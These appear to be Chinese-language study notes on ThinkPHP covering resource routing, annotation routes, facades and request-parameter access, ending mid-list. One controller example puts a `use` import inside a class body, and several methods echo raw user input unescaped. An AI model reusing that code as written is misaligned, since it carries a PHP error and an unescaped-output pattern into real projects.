<p><a href="https://imgse.com/i/ppF82f1" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppF82f1.png" alt="ppF82f1.png"></a></p>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span><span class="hljs-params">($id)</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;&#x4FEE;&#x6539;&#x8868;&#x5355;&#x9875;&#x9762;edit&apos;</span>.$id;
    }
</code></pre>
<p><a href="https://imgse.com/i/ppF8WSx" target="_blank"><img src="https://s1.ax1x.com/2023/03/02/ppF8WSx.png" alt="ppF8WSx.png"></a></p>
<p>&#x652F;&#x6301;&#x8BBE;&#x7F6E;<code>RESTFul</code>&#x8BF7;&#x6C42;&#x7684;&#x8D44;&#x6E90;&#x8DEF;&#x7531;&#xFF0C;&#x65B9;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>Route::resource(&apos;blog&apos;, &apos;Blog&apos;);
</code></pre><p>&#x8868;&#x793A;&#x6CE8;&#x518C;&#x4E86;&#x4E00;&#x4E2A;&#x540D;&#x79F0;&#x4E3A;<code>blog</code>&#x7684;&#x8D44;&#x6E90;&#x8DEF;&#x7531;&#x5230;<code>Blog</code>&#x63A7;&#x5236;&#x5668;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x81EA;&#x52A8;&#x6CE8;&#x518C;7&#x4E2A;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</p>
<table>
<thead>
<tr>
<th style="text-align:left">&#x6807;&#x8BC6;</th>
<th style="text-align:left">&#x8BF7;&#x6C42;&#x7C7B;&#x578B;</th>
<th style="text-align:left">&#x751F;&#x6210;&#x8DEF;&#x7531;&#x89C4;&#x5219;</th>
<th style="text-align:left">&#x5BF9;&#x5E94;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#xFF08;&#x9ED8;&#x8BA4;&#xFF09;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">index</td>
<td style="text-align:left">GET</td>
<td style="text-align:left"><code>blog</code></td>
<td style="text-align:left">index</td>
</tr>
<tr>
<td style="text-align:left">create</td>
<td style="text-align:left">GET</td>
<td style="text-align:left"><code>blog/create</code></td>
<td style="text-align:left">create</td>
</tr>
<tr>
<td style="text-align:left">save</td>
<td style="text-align:left">POST</td>
<td style="text-align:left"><code>blog</code></td>
<td style="text-align:left">save</td>
</tr>
<tr>
<td style="text-align:left">read</td>
<td style="text-align:left">GET</td>
<td style="text-align:left"><code>blog/:id</code></td>
<td style="text-align:left">read</td>
</tr>
<tr>
<td style="text-align:left">edit</td>
<td style="text-align:left">GET</td>
<td style="text-align:left"><code>blog/:id/edit</code></td>
<td style="text-align:left">edit</td>
</tr>
<tr>
<td style="text-align:left">update</td>
<td style="text-align:left">PUT</td>
<td style="text-align:left"><code>blog/:id</code></td>
<td style="text-align:left">update</td>
</tr>
<tr>
<td style="text-align:left">delete</td>
<td style="text-align:left">DELETE</td>
<td style="text-align:left"><code>blog/:id</code></td>
<td style="text-align:left">delete</td>
</tr>
</tbody>
</table>
<p>&#x5177;&#x4F53;&#x6307;&#x5411;&#x7684;&#x63A7;&#x5236;&#x5668;&#x7531;&#x8DEF;&#x7531;&#x5730;&#x5740;&#x51B3;&#x5B9A;&#xFF0C;&#x4F60;&#x53EA;&#x9700;&#x8981;&#x4E3A;<code>Blog</code>&#x63A7;&#x5236;&#x5668;&#x521B;&#x5EFA;&#x4EE5;&#x4E0A;&#x5BF9;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x5C31;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x4E0B;&#x9762;&#x7684;URL&#x8BBF;&#x95EE;&#xFF1A;</p>
<pre><code>http://serverName/blog/
http://serverName/blog/128
http://serverName/blog/28/edit
</code></pre><p>Blog&#x63A7;&#x5236;&#x5668;&#x4E2D;&#x7684;&#x5BF9;&#x5E94;&#x65B9;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>&lt;?php
namespace app\controller;

class Blog
{
    public function index()
    {
    }

    public function read($id)
    {
    }

    public function edit($id)
    {
    }
}
</code></pre><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x884C;&#x5FEB;&#x901F;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x8D44;&#x6E90;&#x63A7;&#x5236;&#x5668;&#x7C7B;&#xFF08;&#x53C2;&#x8003;&#x540E;&#x9762;&#x7684;&#x63A7;&#x5236;&#x5668;&#x7AE0;&#x8282;&#x7684;&#x8D44;&#x6E90;&#x63A7;&#x5236;&#x5668;&#x4E00;&#x8282;&#xFF09;&#x3002;</p>
<p>&#x53EF;&#x4EE5;&#x6539;&#x53D8;&#x9ED8;&#x8BA4;&#x7684;id&#x53C2;&#x6570;&#x540D;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::resource(&apos;blog&apos;, &apos;Blog&apos;)
    -&gt;vars([&apos;blog&apos; =&gt; &apos;blog_id&apos;]);
</code></pre><p>&#x63A7;&#x5236;&#x5668;&#x7684;&#x65B9;&#x6CD5;&#x5B9A;&#x4E49;&#x9700;&#x8981;&#x8C03;&#x6574;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>&lt;?php
namespace app\controller;

class Blog
{
    public function index()
    {
    }

    public function read($blog_id)
    {
    }

    public function edit($blog_id)
    {
    }
}
</code></pre><p>&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x5B9A;&#x4E49;&#x8D44;&#x6E90;&#x8DEF;&#x7531;&#x7684;&#x65F6;&#x5019;&#x9650;&#x5B9A;&#x6267;&#x884C;&#x7684;&#x65B9;&#x6CD5;&#xFF08;&#x6807;&#x8BC6;&#xFF09;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>// &#x53EA;&#x5141;&#x8BB8;index read edit update &#x56DB;&#x4E2A;&#x64CD;&#x4F5C;
Route::resource(&apos;blog&apos;, &apos;Blog&apos;)
    -&gt;only([&apos;index&apos;, &apos;read&apos;, &apos;edit&apos;, &apos;update&apos;]);

// &#x6392;&#x9664;index&#x548C;delete&#x64CD;&#x4F5C;
Route::resource(&apos;blog&apos;, &apos;Blog&apos;)
    -&gt;except([&apos;index&apos;, &apos;delete&apos;]);
</code></pre><p>&#x8D44;&#x6E90;&#x8DEF;&#x7531;&#x7684;&#x6807;&#x8BC6;&#x4E0D;&#x53EF;&#x66F4;&#x6539;&#xFF0C;&#x4F46;&#x751F;&#x6210;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x548C;&#x5BF9;&#x5E94;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x3002;</p>
<p>&#x5982;&#x679C;&#x9700;&#x8981;&#x66F4;&#x6539;&#x67D0;&#x4E2A;&#x8D44;&#x6E90;&#x8DEF;&#x7531;&#x6807;&#x8BC6;&#x7684;&#x5BF9;&#x5E94;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x65B9;&#x6CD5;&#xFF1A;</p>
<pre><code>Route::rest(&apos;create&apos;,[&apos;GET&apos;, &apos;/add&apos;,&apos;add&apos;]);
</code></pre><p>&#x8BBE;&#x7F6E;&#x4E4B;&#x540E;&#xFF0C;URL&#x8BBF;&#x95EE;&#x53D8;&#x4E3A;&#xFF1A;</p>
<pre><code>http://serverName/blog/create
&#x53D8;&#x6210;
http://serverName/blog/add
</code></pre><p>&#x521B;&#x5EFA;blog&#x9875;&#x9762;&#x7684;&#x5BF9;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x4E5F;&#x53D8;&#x6210;&#x4E86;add&#x3002;</p>
<p>&#x652F;&#x6301;&#x6279;&#x91CF;&#x66F4;&#x6539;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>Route::rest([
    &apos;save&apos;   =&gt; [&apos;POST&apos;, &apos;&apos;, &apos;store&apos;],
    &apos;update&apos; =&gt; [&apos;PUT&apos;, &apos;/:id&apos;, &apos;save&apos;],
    &apos;delete&apos; =&gt; [&apos;DELETE&apos;, &apos;/:id&apos;, &apos;destory&apos;],
]);
</code></pre><h4 id="&#x8D44;&#x6E90;&#x5D4C;&#x5957;">&#x8D44;&#x6E90;&#x5D4C;&#x5957;</h4>
<p>&#x652F;&#x6301;&#x8D44;&#x6E90;&#x8DEF;&#x7531;&#x7684;&#x5D4C;&#x5957;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>Route::resource(&apos;blog&apos;, &apos;Blog&apos;);
Route::resource(&apos;blog.comment&apos;,&apos;Comment&apos;);
</code></pre><p>&#x5C31;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x5982;&#x4E0B;&#x5730;&#x5740;&#xFF1A;</p>
<pre><code>http://serverName/blog/128/comment/32
http://serverName/blog/128/comment/32/edit
</code></pre><p>&#x751F;&#x6210;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x5206;&#x522B;&#x662F;&#xFF1A;</p>
<pre><code>blog/:blog_id/comment/:id
blog/:blog_id/comment/:id/edit
</code></pre><p>Comment&#x63A7;&#x5236;&#x5668;&#x5BF9;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>&lt;?php

namespace app\controller;

class Comment
{
    public function edit($id, $blog_id)
    {
    }
}
</code></pre><p>edit&#x65B9;&#x6CD5;&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x987A;&#x5E8F;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#xFF0C;&#x4F46;&#x53C2;&#x6570;&#x540D;&#x79F0;&#x5FC5;&#x987B;&#x6EE1;&#x8DB3;&#x5B9A;&#x4E49;&#x8981;&#x6C42;&#x3002;</p>
<p>&#x5982;&#x679C;&#x9700;&#x8981;&#x6539;&#x53D8;&#x5176;&#x4E2D;&#x7684;&#x53D8;&#x91CF;&#x540D;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF1A;</p>
<pre><code>// &#x66F4;&#x6539;&#x5D4C;&#x5957;&#x8D44;&#x6E90;&#x8DEF;&#x7531;&#x7684;blog&#x8D44;&#x6E90;&#x7684;&#x8D44;&#x6E90;&#x53D8;&#x91CF;&#x540D;&#x4E3A;blogId
Route::resource(&apos;blog.comment&apos;, &apos;index/comment&apos;)
    -&gt;vars([&apos;blog&apos; =&gt; &apos;blogId&apos;]);
</code></pre><p>Comment&#x63A7;&#x5236;&#x5668;&#x5BF9;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x6539;&#x53D8;&#x4E3A;&#xFF1A;</p>
<pre><code>&lt;?php
namespace app\controller;

class Comment
{
    public function edit($id, $blogId)
    {
    }
}
</code></pre><h4 id="&#x6CE8;&#x89E3;&#x8DEF;&#x7531;">&#x6CE8;&#x89E3;&#x8DEF;&#x7531;</h4>
<p>ThinkPHP&#x652F;&#x6301;&#x4F7F;&#x7528;&#x6CE8;&#x89E3;&#x65B9;&#x5F0F;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#xFF08;&#x4E5F;&#x79F0;&#x4E3A;&#x6CE8;&#x89E3;&#x8DEF;&#x7531;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6CE8;&#x89E3;&#x8DEF;&#x7531;&#x9700;&#x8981;&#x5B89;&#x88C5;&#x989D;&#x5916;&#x7684;&#x6269;&#x5C55;&#xFF1A;</p>
<pre><code>composer require topthink/think-annotation
</code></pre><p>&#x7136;&#x540E;&#x53EA;&#x9700;&#x8981;&#x76F4;&#x63A5;&#x5728;&#x63A7;&#x5236;&#x5668;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;&#x6CE8;&#x91CA;&#x4E2D;&#x5B9A;&#x4E49;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>&lt;?php
namespace app\controller;

use think\annotation\Route;

class Index
{
    /**
     * @param  string $name &#x6570;&#x636E;&#x540D;&#x79F0;
     * @return mixed
     * @Route(&quot;hello/:name&quot;)
     */
    public function hello($name)
    {
        return &apos;hello,&apos;.$name;
    }
}
</code></pre><p><code>@Route(&quot;hello/:name&quot;)</code> &#x5C31;&#x662F;&#x6CE8;&#x89E3;&#x8DEF;&#x7531;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x8BF7;&#x52A1;&#x5FC5;&#x6CE8;&#x610F;&#x6CE8;&#x91CA;&#x7684;&#x89C4;&#x8303;&#xFF0C;&#x4E0D;&#x80FD;&#x5728;&#x6CE8;&#x89E3;&#x8DEF;&#x7531;&#x91CC;&#x9762;&#x4F7F;&#x7528;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x5426;&#x5219;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x6CE8;&#x89E3;&#x8DEF;&#x7531;&#x89E3;&#x6790;&#x5931;&#x8D25;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;IDE&#x751F;&#x6210;&#x89C4;&#x8303;&#x7684;&#x6CE8;&#x91CA;&#x3002;&#x5982;&#x679C;&#x4F60;&#x4F7F;&#x7528;<code>PHPStorm</code>&#x7684;&#x8BDD;&#xFF0C;&#x5EFA;&#x8BAE;&#x5B89;&#x88C5;<code>PHP Annotations</code>&#x63D2;&#x4EF6;&#xFF1A;<a href="https://plugins.jetbrains.com/plugin/7320-php-annotations" target="_blank">https://plugins.jetbrains.com/plugin/7320-php-annotations</a> &#xFF0C;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x6CE8;&#x89E3;&#x7684;&#x81EA;&#x52A8;&#x5B8C;&#x6210;&#x3002;</p>
<blockquote>
<p>&#x8BE5;&#x65B9;&#x5F0F;&#x5B9A;&#x4E49;&#x7684;&#x8DEF;&#x7531;&#x5728;&#x8C03;&#x8BD5;&#x6A21;&#x5F0F;&#x4E0B;&#x9762;&#x5B9E;&#x65F6;&#x751F;&#x6548;&#xFF0C;&#x90E8;&#x7F72;&#x6A21;&#x5F0F;&#x5219;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x8BBF;&#x95EE;&#x7684;&#x65F6;&#x5019;&#x751F;&#x6210;&#x6CE8;&#x89E3;&#x7F13;&#x5B58;&#x3002;</p>
</blockquote>
<p>&#x7136;&#x540E;&#x5C31;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;URL&#x5730;&#x5740;&#x8BBF;&#x95EE;&#xFF1A;</p>
<pre><code>http://tp5.com/hello/thinkphp
</code></pre><p>&#x9875;&#x9762;&#x8F93;&#x51FA;</p>
<pre><code>hello,thinkphp
</code></pre><p>&#x9ED8;&#x8BA4;&#x6CE8;&#x518C;&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x662F;&#x652F;&#x6301;&#x6240;&#x6709;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x8BF7;&#x6C42;&#x7C7B;&#x578B;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x4E2D;&#x6307;&#x5B9A;&#x8BF7;&#x6C42;&#x7C7B;&#x578B;&#xFF1A;</p>
<pre><code>&lt;?php
namespace app\controller;

use think\annotation\Route;

class Index
{
    /**
     * @param  string $name &#x6570;&#x636E;&#x540D;&#x79F0;
     * @return mixed
     * @Route(&quot;hello/:name&quot;, method=&quot;GET&quot;)
     */
    public function hello($name)
    {
        return &apos;hello,&apos;.$name;
    }
}
</code></pre><p>&#x5982;&#x679C;&#x6709;&#x8DEF;&#x7531;&#x53C2;&#x6570;&#x9700;&#x8981;&#x5B9A;&#x4E49;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5728;&#x540E;&#x9762;&#x6DFB;&#x52A0;&#x65B9;&#x6CD5;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>&lt;?php
namespace app\controller;

use think\annotation\Route;

class Index
{
    /**
     * @param string $name &#x6570;&#x636E;&#x540D;&#x79F0;
     * @Route(&quot;hello/:name&quot;, method=&quot;GET&quot;, https=1, ext=&quot;html&quot;)
     * @return mixed
     */
    public function hello($name)
    {
        return &apos;hello,&apos;.$name;
    }
}
</code></pre><p>&#x652F;&#x6301;&#x5728;&#x7C7B;&#x7684;&#x6CE8;&#x91CA;&#x91CC;&#x9762;&#x5B9A;&#x4E49;&#x8D44;&#x6E90;&#x8DEF;&#x7531;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>&lt;?php
namespace app\controller;

use think\annotation\route\Resource;

/**
 * @Resource(&quot;blog&quot;)
 */
class Blog
{
    public function index()
    {
    }

    public function read($id)
    {
    }

    public function edit($id)
    {
    }
}
</code></pre><p>&#x5982;&#x679C;&#x9700;&#x8981;&#x5B9A;&#x4E49;&#x8DEF;&#x7531;&#x5206;&#x7EC4;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
<pre><code>&lt;?php
namespace app\controller;

use think\annotation\route\Group;
use think\annotation\route\Route;

/**
 * @Group(&quot;blog&quot;)
 */
class Blog
{
    /**
     * @param  string $name &#x6570;&#x636E;&#x540D;&#x79F0;
     * @return mixed
     * @Route(&quot;hello/:name&quot;, method=&quot;GET&quot;)
     */
    public function hello($name)
    {
        return &apos;hello,&apos;.$name;
    }
}
</code></pre><p>&#x5F53;&#x524D;&#x63A7;&#x5236;&#x5668;&#x4E2D;&#x7684;&#x6CE8;&#x89E3;&#x8DEF;&#x7531;&#x4F1A;&#x81EA;&#x52A8;&#x52A0;&#x5165;<code>blog</code>&#x5206;&#x7EC4;&#x4E0B;&#x9762;&#xFF0C;&#x6700;&#x7EC8;&#xFF0C;&#x4F1A;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;<code>blog/hello/:name</code>&#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x3002;&#x4F60;&#x4E00;&#x6837;&#x53EF;&#x4EE5;&#x5BF9;&#x8BE5;&#x8DEF;&#x7531;&#x5206;&#x7EC4;&#x8BBE;&#x7F6E;&#x516C;&#x5171;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>&lt;?php
namespace app\controller;

use think\annotation\route\Middleware;
use think\annotation\route\Group;
use think\annotation\route\Route;
use think\middleware\SessionInit;

/**
 * @Group(&quot;blog&quot;,ext=&quot;html&quot;)
 * @Middleware({SessionInit::class})
 */
class Blog
{
    /**
     * @param  string $name &#x6570;&#x636E;&#x540D;&#x79F0;
     * @return mixed
     * @Route(&quot;hello/:name&quot;,method=&quot;GET&quot;)
     */
    public function hello($name)
    {
        return &apos;hello,&apos;.$name;
    }
}
</code></pre><h4 id="&#x95E8;&#x9762;&#x6A21;&#x5F0F;">&#x95E8;&#x9762;&#x6A21;&#x5F0F;</h4>
<p>&#x7CFB;&#x7EDF;&#x5DF2;&#x7ECF;&#x4E3A;&#x5927;&#x90E8;&#x5206;&#x6838;&#x5FC3;&#x7C7B;&#x5E93;&#x5B9A;&#x4E49;&#x4E86;<code>Facade</code>&#xFF0C;&#x6240;&#x4EE5;&#x4F60;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>Facade</code>&#x6765;&#x8BBF;&#x95EE;&#x8FD9;&#x4E9B;&#x7CFB;&#x7EDF;&#x7C7B;&#xFF0C;&#x5F53;&#x7136;&#x4E5F;&#x53EF;&#x4EE5;&#x4E3A;&#x4F60;&#x7684;&#x5E94;&#x7528;&#x7C7B;&#x5E93;&#x6DFB;&#x52A0;&#x9759;&#x6001;&#x4EE3;&#x7406;&#x3002;</p>
<p>&#x5982;&#x4E0B;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">common</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span><span class="hljs-params">($name)</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;hello,&apos;</span> . $name;
    }
}
</code></pre>
<p>&#x8C03;&#x7528;hello&#x65B9;&#x6CD5;&#x7684;&#x4EE3;&#x7801;&#x5E94;&#x8BE5;&#x7C7B;&#x4F3C;&#x4E8E;&#xFF1A;</p>
<pre><code class="lang-php">$test = <span class="hljs-keyword">new</span> \app\common\Test;
<span class="hljs-keyword">echo</span> $test-&gt;hello(<span class="hljs-string">&apos;thinkphp&apos;</span>); <span class="hljs-comment">// &#x8F93;&#x51FA; hello&#xFF0C;thinkphp</span>
</code></pre>
<p>&#x800C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x9759;&#x6001;&#x4EE3;&#x7406;&#x7C7B;<code>app\facade\Test</code></p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">facade</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Facade</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Facade</span>
</span>{
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFacadeClass</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;app\common\Test&apos;</span>;
    }
}
</code></pre>
<p>&#x53EA;&#x8981;&#x8FD9;&#x4E2A;&#x7C7B;&#x5E93;&#x7EE7;&#x627F;<code>think\Facade</code>&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x9759;&#x6001;&#x65B9;&#x5F0F;&#x8C03;&#x7528;&#x52A8;&#x6001;&#x7C7B;<code>app\common\Test</code>&#x7684;&#x52A8;&#x6001;&#x65B9;&#x6CD5;</p>
<pre><code class="lang-php"><span class="hljs-comment">// &#x65E0;&#x9700;&#x8FDB;&#x884C;&#x5B9E;&#x4F8B;&#x5316; &#x76F4;&#x63A5;&#x4EE5;&#x9759;&#x6001;&#x65B9;&#x6CD5;&#x65B9;&#x5F0F;&#x8C03;&#x7528;hello</span>
<span class="hljs-keyword">echo</span> \app\facade\Test::hello(<span class="hljs-string">&apos;thinkphp&apos;</span>);
</code></pre>
<pre><code class="lang-http">app/common/Test.php
</code></pre>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/31/77bcc815c78fe726.png" alt=""></p>
<pre><code class="lang-http">app/facade/Test.php
</code></pre>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/31/a5365c572bf815b2.png" alt=""></p>
<pre><code class="lang-http">app/controller/index.php  -&gt; test()
</code></pre>
<p><img src="https://s3.bmp.ovh/imgs/2023/01/31/d051516daf19ecb6.png" alt=""></p>
<p>&#x8FD9;&#x91CC;&#x5C31;&#x662F;&#x5728;app&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x95E8;&#x9762;&#xFF0C;&#x6307;&#x5411;common&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x901A;&#x8FC7;index&#x63A7;&#x5236;&#x5668;&#x4E0B;&#x7684;test()&#x65B9;&#x6CD5;&#x8C03;&#x7528;</p>
<h4 id="&#x8BF7;&#x6C42;&#x5BF9;&#x8C61;&#x548C;&#x4FE1;&#x606F;">&#x8BF7;&#x6C42;&#x5BF9;&#x8C61;&#x548C;&#x4FE1;&#x606F;</h4>
<p>&#x5C06;&#x8F93;&#x5165;&#x7684;username&#x6253;&#x5370;&#x51FA;&#x6765;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controller</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Request</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">rely</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(Request $request)</span>
    </span>{
        $this-&gt;request = $request;
    }
    <span class="hljs-comment">// &#x7B2C;&#x4E00;&#x79CD;&#x76F4;&#x63A5;return&#x8FD4;&#x56DE;</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">return</span> $_GET[<span class="hljs-string">&apos;username&apos;</span>];
    }
    <span class="hljs-comment">// &#x7B2C;&#x4E8C;&#x79CD;&#x901A;&#x8FC7;&#x4F9D;&#x8D56;&#x6CE8;&#x5165;</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span><span class="hljs-params">(Request $request)</span>
    </span>{
        <span class="hljs-keyword">return</span> $request-&gt;param(<span class="hljs-string">&apos;username&apos;</span>);
    }
    <span class="hljs-comment">//&#x7B2C;&#x4E09;&#x79CD;&#xFF0C;&#x7528;&#x6784;&#x9020;&#x51FD;&#x6570;&#x4FDD;&#x5B58;&#x4E0B;&#x6765;</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">return</span> $this-&gt;request-&gt;param(<span class="hljs-string">&apos;username&apos;</span>);
    }    
    <span class="hljs-comment">//&#x7B2C;&#x56DB;&#x79CD;&#xFF0C;&#x95E8;&#x9762;&#x6A21;&#x5F0F;facade</span>
    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Request</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">post</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">return</span> Request::param(<span class="hljs-string">&apos;username&apos;</span>);
    }
    <span class="hljs-comment">//&#x7B2C;&#x4E94;&#x79CD;&#xFF0C;&#x52A9;&#x624B;&#x51FD;&#x6570;</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get1</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">return</span> Request()-&gt;param(<span class="hljs-string">&apos;username&apos;</span>);
    }    


}
</code></pre>
<p>===</p>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1234</span><span class="hljs-params">()</span>
    </span>{
        Request::has(<span class="hljs-string">&apos;id&apos;</span>,<span class="hljs-string">&apos;get&apos;</span>);
    }
</code></pre>
<p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>Request</code>&#x5BF9;&#x8C61;&#x5B8C;&#x6210;&#x5168;&#x5C40;&#x8F93;&#x5165;&#x53D8;&#x91CF;&#x7684;&#x68C0;&#x6D4B;&#x3001;&#x83B7;&#x53D6;&#x548C;&#x5B89;&#x5168;&#x8FC7;&#x6EE4;&#xFF0C;&#x652F;&#x6301;&#x5305;&#x62EC;<code>$_GET</code>&#x3001;<code>$_POST</code>&#x3001;<code>$_REQUEST</code>&#x3001;<code>$_SERVER</code>&#x3001;<code>$_SESSION</code>&#x3001;<code>$_COOKIE</code>&#x3001;<code>$_ENV</code>&#x7B49;&#x7CFB;&#x7EDF;&#x53D8;&#x91CF;&#xFF0C;&#x4EE5;&#x53CA;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x4FE1;&#x606F;&#x3002;</p>
<p>&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8BF4;&#x660E;&#xFF0C;&#x672C;&#x7BC7;&#x5185;&#x5BB9;&#x7684;&#x6240;&#x6709;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x5747;&#x4F7F;&#x7528;<code>Facade</code>&#x65B9;&#x5F0F;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x9996;&#x5148;&#x5F15;&#x5165;</p>
<pre><code>use think\facade\Request;
</code></pre><p>&#x5982;&#x679C;&#x4F60;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x4F9D;&#x8D56;&#x6CE8;&#x5165;&#xFF0C;&#x8BF7;&#x81EA;&#x884C;&#x8C03;&#x6574;&#x4EE3;&#x7801;&#x4E3A;&#x52A8;&#x6001;&#x8C03;&#x7528;&#x5373;&#x53EF;&#x3002;</p>
<p>&#x4E3B;&#x8981;&#x5185;&#x5BB9;&#x5305;&#x62EC;&#xFF1A;</p>
<ul>
